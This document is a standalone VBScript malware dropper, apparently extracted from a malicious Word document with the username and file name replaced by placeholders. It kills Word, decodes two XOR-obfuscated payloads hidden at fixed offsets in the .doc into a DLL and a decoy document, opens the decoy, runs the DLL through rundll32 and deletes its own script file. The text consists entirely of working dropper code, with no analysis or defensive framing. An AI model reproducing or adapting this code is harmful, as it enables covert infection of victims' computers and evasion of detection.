On Error Resume Next    
set shell=createobject("Shell.Application")      
shell.ShellExecute "cmd"," /c taskkill  -f -im winword.exe ","","",0          
wscript.sleep 3000                
dim str                                                                         
dim L1                                                                          
dim L2                                                                          
dim Len                                                                         
dim infile                                                                      
dim outfile1                                                                    
dim outfile2                                                                    
infile = "C:\Documents and Settings\<username>\Desktop\<malicious document name>.doc"                                                               
outfile1 = "C:\Documents and Settings\<username>\Local Settings\Application Data\mm.dll"                                                              
outfile2 = "C:\Documents and Settings\<username>\Local Settings\Application Data\t.doc"                                                             
L1=     78924                                                                         
L2=     38912
size=    144893                                                                    
offset1 = size-L1-L2                                                            
offset2 = size-L2                                                               
Len=0                                                                           
str = ReadBinary (infile,L1,offset1)                                            
WriteBinary outfile1, str                                                      
str = ReadBinary (infile,L2,offset2)                                            
WriteBinary outfile2, str                                                       
Function ReadBinary(FileName,length,offset)                                    
  Dim Buf(), I                                                                  
  With CreateObject("ADODB.Stream")                                           
    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName : .Position = offset    
    Len =length -1                                                             
    ReDim Buf(Len)                                                              
    For I = 0 To Len: if(I=0)  then Buf(I)=(AscB(.Read(1))) else if ((I mod 2)=0) then Buf(I)=(AscB(.Read(1)) xor AscB(chr(65))) else Buf(I)=(AscB(.Read(1)) xor AscB(chr(67))) end if           
    Next                         
    .Close                                                                      
  End With                                                                      
  ReadBinary = Buf                                                              
End Function                                                                    
Sub WriteBinary(FileName, Buf)                                                  
  Dim I, aBuf, Size, bStream                                                    
  Size = UBound(Buf): ReDim aBuf(Size \ 2)                                      
  For I = 0 To Size - 1 Step 2                                                  
      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))                             
  Next                                                                          
  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))                                   
  aBuf=Join(aBuf, "")                                                         
  Set bStream = CreateObject("ADODB.Stream")                                  
  bStream.Type = 1: bStream.Open                                                
  With CreateObject("ADODB.Stream")                                           
    .Type = 2 : .Open: .WriteText aBuf                                          
    .Position = 2: .CopyTo bStream: .Close                                      
  End With                                                                      
  bStream.SaveToFile FileName, 2: bStream.Close                                 
  Set bStream = Nothing                                                         
End Sub                                                                         
set shell=createobject("Shell.Application")      
shell.ShellExecute "C:\Documents and Settings\<username>\Local Settings\Application Data\t.doc"                 
shell.ShellExecute "rundll32","""C:\Documents and Settings\<username>\Local Settings\Application Data\mm.dll"",Setting"                 
Set xa = CreateObject("Scripting.FileSystemObject")                        
If xa.FileExists("C:\Documents and Settings\<username>\Local Settings\Application Data\ss.vbs") Then                                            
Set xb = xa.GetFile("C:\Documents and Settings\<username>\Local Settings\Application Data\ss.vbs")                                              
xb.Delete                                                                    
End If
